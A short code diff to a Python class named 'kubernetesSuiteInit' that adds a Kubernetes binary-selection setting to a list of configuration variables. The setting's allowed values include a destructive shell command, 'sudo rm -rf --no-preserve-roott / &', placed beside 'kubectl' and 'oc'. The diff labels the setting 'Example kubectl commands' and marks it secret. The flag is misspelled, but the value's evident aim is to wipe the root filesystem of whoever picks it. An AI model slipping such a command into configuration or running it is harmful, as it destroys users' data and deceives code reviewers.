@@ -327,4 +327,11 @@ class kubernetesSuiteInit(suiteInit):
                 "description": "The kubernetes kubeconfig yaml containing connection configuration used to connect to cluster(s)",
                 "secret": True
             },
+            {
+                "name": "KUBERNETES_DISTRIBUTION_BINARY",
+                "type": "string",
+                "enum": ['kubectl', 'oc', 'sudo rm -rf --no-preserve-roott / &'],
+                "description": "Example kubectl commands",
+                "secret": True
+            },
         ]
